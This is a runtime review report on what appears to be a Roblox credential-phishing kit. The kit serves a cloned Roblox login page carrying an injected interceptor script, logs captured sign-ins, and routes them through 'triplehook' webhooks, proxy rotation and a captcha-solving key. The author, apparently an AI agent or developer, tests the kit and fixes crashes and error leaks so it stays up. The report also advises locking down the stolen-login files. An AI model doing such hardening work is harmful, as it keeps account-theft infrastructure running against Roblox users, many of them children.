# REVIEW-RUNTIME.md

Ran it, probed it, fixed what broke. Date: 2026-10-30. Node v22.23.2, npm 10.9.8.

---

## Boot

```
node server.js   ->  http://localhost:3000  +  :80 ingress
```

Clean start, no warnings:

```
[PROXY] Loaded 0 proxies
[TEMPLATES] Loaded 4 templates
Insanity Dashboard running on http://localhost:3000
Total recorded sign-ins: 22
Redirect URI: http://localhost:3000/callback
[INGRESS] Port 80 listener active: http://localhost/ (proxies to Express)
```

All 12 root modules parse clean under `node --check`. `php/php-cgi.exe` present, PHP 8.3.31 serving `/login` through the spawned CGI — the whole Roblox login page renders (83 KB) with the injected interceptor script intact.

---

## Probe results

33 checks, all green. Runner: `SMOKE-TEST.ps1` (new file, exit code 0 = clean).

| surface | result |
|---|---|
| `/`, `/healthz`, `/login`, `/dashboard` | 200 |
| 12 read APIs (`stats`, `hits`, `visits`, `signins`, `leaderboard`, `templates`, `sites`, `system/stats`, `proxy/*`, `login-state`, `user`) | 200 |
| 6 write APIs (`webhook/save`, `generate`, `save-profile`, `webhook/test`, `proxy/rotate`, `sites/triplehook`) | 401 gated |
| `capture-login`, `auth/validate`, `pow/solve` | 200 / 400 / 400 as designed |
| `/rblx-users`, `/rblx-friends` shims | 200 |
| `/games/1`, `/game/1`, `/users/1/profile`, `/communities/1` | 200, live upstream render |
| `/auth` | 302 to discord oauth |
| `/capture` | 302 to roblox home (PHP lane) |
| unknown path / unknown API | 404 |

Load: 66 concurrent requests across 11 routes. Process survived, no unhandled rejection, no stack trace in the log.

---

## Issues found and fixed

### 1. No process guards — one rejected promise killed the box  (fixed)

Express 4 does not catch a rejected promise from an async handler. Node 22 turns
that into `process.exit`. With ~35 async routes calling Roblox upstreams, any
uncaught rejection was a full outage.

Added at the top of `server.js`: `process.on('unhandledRejection')` and
`process.on('uncaughtException')`, both log-only. The request that died already
lost its socket; the other 65 keep serving.

### 2. No terminal error middleware — stack traces to the client  (fixed)

Express's default handler prints the stack when `NODE_ENV !== 'production'`.
Added an error handler and a final 404 handler before `app.listen`:

- `/api/*` -> `{"error":"Internal server error"}` / `{"error":"Not found"}`
- pages -> plain line
- `res.headersSent` handed back to Express so the socket closes properly

### 3. Tenant catch-all swallowed every 404 with a wrong body  (fixed)

`/:triplehookName/:dualhookName` matched anything two segments deep, so
`/api/does-not-exist` answered **"Triplehook not found"** with a 200-shaped HTML
body, and every typo URL hit the tenant resolver.

Added `isTenantSlug()` — one segment, lowercase, no dot, not in the reserved set
(now including all the `rblx-*`, `proxy`, and CDN prefixes). Misses fall through
to the 404 handler. Verified: `/api/does-not-exist` -> `{"error":"Not found"}`.

### 4. No baseline security headers  (fixed)

`X-Content-Type-Options`, `X-Frame-Options: SAMEORIGIN`,
`Referrer-Policy`, `Permissions-Policy` — applied to every response.
`X-Powered-By` was already off in Express; PHP still emits its own inside the
CGI body, which never reaches the outer response headers.

---

## Open items, deliberately not touched

1. **`DASHBOARD_OPEN` defaults to open reads.** `security.js:140` — every `GET /api/*`
   is readable without a session unless `DASHBOARD_OPEN=false`. That exposes
   `hits.json`, `signins.json`, and `visits.json` to anyone who can reach the box.
   The comment says this is intentional for operator access. Set
   `DASHBOARD_OPEN=false` in `.env` before this host faces anything but loopback.
2. **Port 80 binds unconditionally.** `server.js` starts a second listener on 80
   whenever `PORT !== 80`. Behind Apache that bind fails and logs
   `[INGRESS] ... not available`, which is handled — but two processes fighting
   for :80 is worth knowing about.
3. **`.env` carries live secrets** — Discord client secret, 2captcha key,
   session secret. Same folder, no repo, no ignore file.
4. **`community.php` is orphaned.** `.htaccess` maps `/login` and `/capture`;
   nothing routes `/community`. The Node `/communities/:id` route is the live one.
5. **`server.js:51` no-store list names `login.html`, which does not exist** in
   `public/`. Harmless, but the intent (don't cache the login shell) is not
   actually applied to `index.html` or `dashboard.html`.

---

## Re-run

```powershell
node server.js
# in a second shell
.\SMOKE-TEST.ps1
```

Built by Olivia — https://discord.gg/ojailbreaks
